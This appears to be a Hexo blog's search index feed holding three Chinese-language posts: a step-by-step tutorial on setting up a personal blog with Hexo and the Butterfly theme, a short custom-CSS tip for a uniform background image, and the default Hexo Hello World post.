        <content type="html"><![CDATA[<h1 id="【2025最新版】搭建个人博客教程"><a href="#【2025最新版】搭建个人博客教程" class="headerlink" title="【2025最新版】搭建个人博客教程"></a>【2025最新版】搭建个人博客教程</h1><h3 id="–小记："><a href="#–小记：" class="headerlink" title="–小记："></a>–小记：</h3><p>在搭建我的这个博客之前我在CSDN也发布过一些文章，目前应该也是几千粉丝了，但是有时候CSDN发布的文章会被系统审核不通过就很烦，而且CSDN老套的博客模板确实不太好看，看到别人都是用自己博客写的就感觉自己很LOW，所以就想自己来搭建一个属于自己的个人博客。当然搭建博客的主要目的也是为了分享一些比较有用的教程给大家的，我搞了蛮久的，每个都需要自己去看一遍才能理解到他的意思。下面就给大家分享一下我是如何搭建我的个人博客的</p><h2 id="1、环境准备"><a href="#1、环境准备" class="headerlink" title="1、环境准备"></a>1、环境准备</h2><p>在我们搭建我们的个人博客之前我们需要准备一下我们的环境（安装下方的顺序来安装，别弄混了）</p><h3 id="1-安装git"><a href="#1-安装git" class="headerlink" title="1.安装git"></a>1.安装git</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ apt install git  /**/安装git</span><br><span class="line">$ git --version /**/查看git的版本</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241209230841891.png" alt="image-20241209230841729">出现了这个git version就代表我们安装成功了</p><h3 id="2-安装node-js环境"><a href="#2-安装node-js环境" class="headerlink" title="2.安装node.js环境"></a>2.安装node.js环境</h3><p>我们需要在我们的机子上安装node.js环境，我这边发现我的服务器好像安装了npm就自带node版本，我不知道为什么，如果你们的服务器安装了npm后仍然没有node环境的话可以找文章去安装一下nodejs，不过好像安装了就附带的。Node 版本一定不要最新的22版本(会出现各种奇怪的问题)，建议16和18稳定版本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install npm # 下载npm软件包</span><br><span class="line">$ sudo apt install nodejs # 下载noede.js环境</span><br><span class="line">$ npm -v  # 验证环境中是否存在正确的 npm 版本</span><br><span class="line">$ node -v # 验证环境中是否存在正确的 node 版本</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241209231833693.png" alt="image-20241209231833640"></p><h3 id="3-注册-GitHub-账号"><a href="#3-注册-GitHub-账号" class="headerlink" title="3.注册 GitHub 账号"></a>3.注册 GitHub 账号</h3><p>打开浏览器，访问 GitHub 官网（<a href="https://github.com/%EF%BC%89%E3%80%82%E5%9C%A8%E9%A6%96%E9%A1%B5%E4%B8%8A%E6%89%BE%E5%88%B0%E2%80%9CSign">https://github.com/）。在首页上找到“Sign</a> up”按钮，点击后按照提示填写相关信息，包括用户名、邮箱地址和密码等，完成注册过程。这个账号将作为存储博客文件的仓库，承载着博客的所有代码和内容。(我相信大家都已经注册过了，我就不演示注册过程了，如果后面有空的话我再来更新这里)</p><h2 id="2、安装hexo"><a href="#2、安装hexo" class="headerlink" title="2、安装hexo"></a>2、安装hexo</h2><h3 id="1-安装hexo框架"><a href="#1-安装hexo框架" class="headerlink" title="1.安装hexo框架"></a>1.安装hexo框架</h3><p>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-cli -g # 安装hexo</span><br></pre></td></tr></table></figure><h3 id="2-初始化hexo"><a href="#2-初始化hexo" class="headerlink" title="2.初始化hexo"></a>2.初始化hexo</h3><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo npm install hexo -g #安装hexo</span><br><span class="line">$ mkdir blog #此处可以是任意你喜欢的名字</span><br><span class="line">$ hexo init blog #初始化部署hexo</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241209233148295.png"></p><p>这样就代表我们已经初始化成功了,此时已经可以打开你的博客了，在Bash里面输入:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo s </span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241209234155619.png" alt="image-20241209234155552"></p><p>这样就代表我们已经在我们的4000端口搭建好了网站。我们可以进入我们的网站看一下，如下图，这个就是我们使用的hexo框架</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241209234446384.png" alt="image-20241209234446006">如果你打不开你的网站的话，你可以去你的服务器看一下是不是你的安全组没有打开！！！切记要先打开你的安全组才能访问到你的这个网站哦，要牢记，其他的也是一样的</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241209234942451.png" alt="4dfefd177286eef60b2e9e8622c6576"></p><h2 id="3、安装butterfly主题"><a href="#3、安装butterfly主题" class="headerlink" title="3、安装butterfly主题"></a>3、安装butterfly主题</h2><h3 id="1-安装butterfly"><a href="#1-安装butterfly" class="headerlink" title="1.安装butterfly"></a>1.安装butterfly</h3><p>hexo-theme-butterfly 是基于 hexo-theme-melody 的基础上进行开发的主题。</p><p>在你的 Hexo 根目录里输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone -b dev https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly #下载稳定版butterfly主题</span><br></pre></td></tr></table></figure><p>当你安装完成之后你可以看到自己的blog&#x2F;themes下面多了一个butterfly主题，这样就代表我们已经安装好了我们的主题</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241209235610263.png" alt="image-20241209235610191"></p><h3 id="2-应用主题"><a href="#2-应用主题" class="headerlink" title="2.应用主题"></a>2.应用主题</h3><p>修改 Hexo 根目录下的 _config.yml，把主题改为 butterfly</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme: butterfly</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210000002816.png"></p><h3 id="3-安装插件"><a href="#3-安装插件" class="headerlink" title="3.安装插件"></a>3.安装插件</h3><p>如果你没有 pug 以及 stylus 的渲染器，请下载安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p>这里我出现了一个问题，就是我的npm install不动了，后面排除因素应该是没有使用国内镜像导致的，换了速度就快了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm config get registry #查看自己的镜像是哪里的</span><br><span class="line">npm config set registry=https://registry.npmmirror.com #更改自己的镜像为国内镜像</span><br><span class="line">//重新执行以下命令查看是否配置成功</span><br><span class="line">npm config get registry</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210000711093.png" alt="image-20241210000710999"></p><h3 id="4-升级建议（我建议实施，便于后期的管理）"><a href="#4-升级建议（我建议实施，便于后期的管理）" class="headerlink" title="4.升级建议（我建议实施，便于后期的管理）"></a>4.升级建议（我建议实施，便于后期的管理）</h3><p>升级完成后，请到 Github 的 Releases 界面查看新版的更新内容。</p><p>里面有标注 _config 文件的变更内容（如有），请根据实际情况更新你的配置内容。</p><p>为了减少升级主题后带来的不便，请使用以下方法（建议，可以不做）：</p><p>在 hexo 的<strong>根目录创建</strong>一个文件 _config.butterfly.yml，并把<strong>主题目录</strong>的 _config.yml 内容复制到 _config.butterfly.yml 去。这边我建议用cp命令，直接将主题的config内容复制到hexo根目录上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp themes/butterfly/_config.yml  _config.butterfly.yml</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210001058170.png" alt="image-20241210001058106"></p><p>注意:</p><p>复制的是主题的 _config.yml ，而不是 hexo 的 _config.yml</p><p>不要把主题目录的 _config.yml 删掉</p><p>以后只需要在 _config.butterfly.yml 进行配置就行。如果使用了 _config.butterfly.yml， 配置主题的 _config.yml 将不会有效果。</p><p>Hexo 会自动合并主题中的 _config.yml 和 _config.butterfly.yml 里的配置，如果存在同名配置，会使用 _config.butterfly.yml 的配置，其优先度较高。</p><p>5.启动环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s #启动本地环境</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210111721978.png"></p><p>当你出现这个butterfly时你就说明你的主题已经安装成功了</p><h2 id="4、主题页面"><a href="#4、主题页面" class="headerlink" title="4、主题页面"></a>4、主题页面</h2><h3 id="1-配置网站页面"><a href="#1-配置网站页面" class="headerlink" title="1.配置网站页面"></a>1.配置网站页面</h3><p>我们打开hexo根目录的_config.yml，首先出现的时网站的页面配置，我们按需修改我们自己的主题名字和标题，作者还有语言这些。修改网站各种资料，例如标题、副标题和邮箱等个人资料，就修改 Hexo 的_config.yml。注释是我自己打上去的，记得<strong>每一个冒号后面都要空一格</strong>，这样才能显示出来效果</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210112302313.png"></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210112429444.png" alt="image-20241210112429168">然后我们可以在_config.butterfly.yml中配置我们的网站图标，这样我们的图标就配置好了，logo那边只要随便在网上找个图片，然后复制一下图片链接就可以了。后续我会出一个picgo联合markdown文档做个图床，然后把链接放到我们自己的云资源中</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210120344203.png" alt="image-20241210120344014"><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210120439711.png" alt="image-20241210120439348"></p><h3 id="2-目录配置"><a href="#2-目录配置" class="headerlink" title="2.目录配置"></a>2.目录配置</h3><p>我们可以看到我们上面有点空，没东西导航，所以我们可以设置我们的网站图标，我们找到_config.butterfly.yml，里面去配置一下我们的目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Home: / || fas fa-home  # 目录</span><br><span class="line">Archives: /archives/ || fas fa-archive #档案</span><br><span class="line">Tags: /tags/ || fas fa-tags #标签</span><br><span class="line">Categories: /categories/ || fas fa-folder-open #分类</span><br><span class="line">List||fas fa-list: #</span><br><span class="line">  Music: /music/ || fas fa-music #音乐</span><br><span class="line">  Movie: /movies/ || fas fa-video #电影</span><br><span class="line">Link: /link/ || fas fa-link #友情链接</span><br><span class="line">About: /about/ || fas fa-heart #关于</span><br></pre></td></tr></table></figure><p>记得在menu下面要留两个空，代表是在menu的下面一层，</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210120943135.png">!<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210121239818.png" alt="image-20241210121239446"></p><p>可以看到我们的目录菜单已经出来了，但是都是英文的，所以我们就只需要去改一下就好了</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210121535762.png" alt="image-20241210121535655"><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210121547809.png" alt="image-20241210121547549"></p><h3 id="3-社交设置"><a href="#3-社交设置" class="headerlink" title="3.社交设置"></a>3.社交设置</h3><p>我们处理完我们的目录我们就可以去搞一下我们的社交媒体类了</p><p>Butterfly 支持 <a href="https://fontawesome.com/icons?from=io">font-awesome v6</a> 图标.</p><p>书写格式 <strong>图标名：url || 描述性文字 || color</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">social:</span><br><span class="line">  fab fa-github: https://github.com/maodoo0701 || Github || &quot;#hdhfbb&quot;</span><br><span class="line">  fas fa-envelope: mailto:maodoo@qq.com || Email || &quot;#000000&quot;</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210153051825.png">设置完之后我们的图标就有变化了，里面就自带跳转链接了</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210153011362.png" alt="image-20241210153004089"></p><h3 id="4-头像设置"><a href="#4-头像设置" class="headerlink" title="4.头像设置"></a>4.头像设置</h3><p>我们设置好我们的社交栏之后就可以设置我们的头像和图标了</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210153142128.png" alt="image-20241210153141993"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">favicon: /img/favicon.png #网站图标</span><br><span class="line">avatar:</span><br><span class="line">  img: /img/avatar.png</span><br><span class="line">  effect: true # 头像会一直转圈</span><br></pre></td></tr></table></figure><p>弄好了就是这个样子，头像会变化，然后图标会改变</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210154730678.png" alt="image-20241210154730126"></p><h3 id="5-背景图和顶部脚步图设置"><a href="#5-背景图和顶部脚步图设置" class="headerlink" title="5.背景图和顶部脚步图设置"></a>5.背景图和顶部脚步图设置</h3><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210155047148.png" alt="image-20241210155046947"></p><p>将脚部的设为true，背景和顶部设为同一个图片，这样就可以看起来更顺滑一点，如果不设置脚步图片true的话就会像下图一样，有点不和谐还是</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210155132421.png" alt="image-20241210155132293"></p><p>设置完之后我们的图片就会和顶部图一模一样了，这样我们可以看起来会更丝滑一点</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210155311892.png" alt="image-20241210155311200"></p><p>但是还是会有一点点的小差别，因为阴影部分感觉不能和背景图的色差保持一致，就会导致不好看，我在另一篇博客上面发了背景一图流，如果感兴趣的话可以再去更改这个背景图</p><h3 id="6-代码块格式设置"><a href="#6-代码块格式设置" class="headerlink" title="6.代码块格式设置"></a>6.代码块格式设置</h3><p>如果你需要 MacOS 风格的代码高亮样式，可以把macStyle 设为 true。这样我们的文章就会展现出是mac格式了，可能要更好看一点</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210160027276.png" alt="image-20241210160027109">下面就是效果图了，变成了mac格式的代码块，我觉得要好看一些</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210160124964.png" alt="image-20241210160124666"></p><h3 id="7-文章封面"><a href="#7-文章封面" class="headerlink" title="7.文章封面"></a>7.文章封面</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cover:</span><br><span class="line">  # 是否显示文章封面</span><br><span class="line">  index_enable: true</span><br><span class="line">  aside_enable: true</span><br><span class="line">  archives_enable: true</span><br><span class="line">  default_cover:</span><br><span class="line">    - https://maodoo.oss-cn-beijing.aliyuncs.com/20241210172528345.jpg</span><br><span class="line">    - https://maodoo.oss-cn-beijing.aliyuncs.com/20241210172459243.png</span><br><span class="line">    #从这两个图片之中随机选取图片</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210172547011.png" alt="image-20241210172546540"></p><p>把所有图片都导入上去之后，我们可以去创建几篇新博客，看看有没有生效，再打开可以发现我们的文章封面已经生效了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo new 我的第一篇博客  #创建标题为“我的第一篇博客”的文章</span><br><span class="line">hexo new 爱笑的个人博客搭建教程 #创建标题为“爱笑的个人博客搭建教程”的文章</span><br><span class="line">hexo cl #清除缓存</span><br><span class="line">hexo s #本地调试预览</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210173555259.png" alt="image-20241210173554270"></p><h3 id="8-主题目录"><a href="#8-主题目录" class="headerlink" title="8.主题目录"></a>8.主题目录</h3><p>搞了这么多，点击了一下目录，发现目录那边每个都点击不起来，原来是我没有配置</p><h4 id="1、标签页"><a href="#1、标签页" class="headerlink" title="1、标签页"></a>1、标签页</h4><p>​    1.前往你的 Hexo 的根目录</p><p>​    2.输入 hexo new page tags</p><p>​    3.你会找到 source&#x2F;tags&#x2F;index.md 这个文件</p><p>​    4.修改这个文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 标签</span><br><span class="line">date: 2018-01-05 00:00:00</span><br><span class="line">type: &#x27;tags&#x27;</span><br><span class="line">orderby: random</span><br><span class="line">order: 1</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h4 id="2-分类页"><a href="#2-分类页" class="headerlink" title="2.分类页"></a>2.分类页</h4><p>分类页文件名不一定是 categories, 例子中的 categories 只是一个示例<br>记得添加 type: “categories”</p><p>​    1.前往你的 Hexo 的根目录</p><p>​    2.输入 hexo new page categories</p><p>​    3.你会找到 source&#x2F;categories&#x2F;index.md 这个文件</p><p>   4.修改这个文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line">date: 2018-01-05 00:00:00</span><br><span class="line">type: &#x27;categories&#x27;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210174436056.png" alt="image-20241210174435927"></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210174448075.png" alt="image-20241210174447852"></p><h4 id="3、友情链接"><a href="#3、友情链接" class="headerlink" title="3、友情链接"></a>3、友情链接</h4><p>​     1.前往你的 Hexo 的根目录</p><p>​     2.输入 hexo new page link</p><p>​     3.你会找到 source&#x2F;link&#x2F;index.md 这个文件</p><p>​     4.修改这个文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 友情链接</span><br><span class="line">date: 2018-06-07 22:17:49</span><br><span class="line">type: &#x27;link&#x27;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210174835223.png" alt="image-20241210174835106"></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210174852250.png" alt="image-20241210174852133"></p><h4 id="5-数据来源"><a href="#5-数据来源" class="headerlink" title="5.数据来源"></a>5.数据来源</h4><p>在 Hexo 根目录中的 source&#x2F;_data（如果没有 _data 文件夹，请自行创建），创建一个文件 link.yml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir _data #创建一个名为data的文件夹</span><br><span class="line">touch link.yml #创建一个名为link.yml的文件</span><br><span class="line">vi link.yml #编辑link.yml</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210175036858.png" alt="image-20241210175036655"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">- class_name: 友情链接</span><br><span class="line">  class_desc: 那些人，那些事</span><br><span class="line">  link_list:</span><br><span class="line">    - name: Hexo</span><br><span class="line">      link: https://hexo.io/zh-tw/</span><br><span class="line">      avatar: https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg</span><br><span class="line">      descr: 快速、简单且强大的网志框架</span><br><span class="line"></span><br><span class="line">- class_name: 网站</span><br><span class="line">  class_desc: 值得推荐的网站</span><br><span class="line">  link_list:</span><br><span class="line">    - name: Youtube</span><br><span class="line">      link: https://www.youtube.com/</span><br><span class="line">      avatar: https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png</span><br><span class="line">      descr: 视频网站</span><br><span class="line">    - name: Weibo</span><br><span class="line">      link: https://www.weibo.com/</span><br><span class="line">      avatar: https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png</span><br><span class="line">      descr: 中国最大社交分享平台</span><br><span class="line">    - name: Twitter</span><br><span class="line">      link: https://twitter.com/</span><br><span class="line">      avatar: https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png</span><br><span class="line">      descr: 社交分享平台</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210175010018.png" alt="image-20241210175009883"></p><p>这样我们的目录部分就搭建完成了，其他地方按需修改即可</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241210175317245.png" alt="image-20241210175316684"></p><p>这个就是差不多整个主题的配置了，还有一些配置我没写出来，但是你们可以去看一下官方文档，那边写的更加详细，或者看哔哩哔哩的卷二兔的课，几乎把所有配置都讲了，还有部署到GitHub的过程，比较多，所以我下期再讲，这期就先到这里。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>个人博客背景一图流</title>
      <link href="/2024/12/08/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E8%83%8C%E6%99%AF%E4%B8%80%E5%9B%BE%E6%B5%81/"/>
      <url>/2024/12/08/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E8%83%8C%E6%99%AF%E4%B8%80%E5%9B%BE%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<h5 id="个人博客背景一图流"><a href="#个人博客背景一图流" class="headerlink" title="个人博客背景一图流"></a>个人博客背景一图流</h5><p>—小记</p><p>当时看到自己的博客和别人的不一样，因为他们的都是背景透明度都是一模一样的，而我的有一些色差，所以就想看看到底要怎么弄才能把图片弄的一模一样的颜色</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241208232428449.png" alt="9f84b2ff3ae96e43e03eabb8b53290ec"></p><p>首先我们在主题下的source文件夹里面新建一个custom.css文件，里面的内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#footer &#123;</span><br><span class="line">  background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">#page-header &#123;</span><br><span class="line">  background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#footer::before &#123;</span><br><span class="line">  background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">#page-header::before &#123;</span><br><span class="line">  background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[data-theme=&quot;dark&quot;] #footer::before &#123;</span><br><span class="line">  background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">[data-theme=&quot;dark&quot;] #page-header::before &#123;</span><br><span class="line">  background: transparent !important;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后找到_config.butterfly.yml文件中的inject配置项的head这个选项，然后复制以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/style.css&quot; media=&quot;defer&quot; onload=&quot;this.media=&#x27;all&#x27;&quot;&gt;</span><br></pre></td></tr></table></figure><p>我的是custom，根据你的文件名修改一下就可以了</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241208231843885.png" alt="c7596bea5d8cd549dc84913bcb012a47">然后在_config.butterfly.yml文件中的<strong>index_img和footer_bg</strong>配置项取消头图与页脚图的加载项避免冗余加载</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241208232259795.png" alt="image-20241208232259642">把index那个直接去掉就可以了，最后大功告成，如下：</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241208232854080.png" alt="image-20241208232853409"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/12/03/hello-world/"/>
      <url>/2024/12/03/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
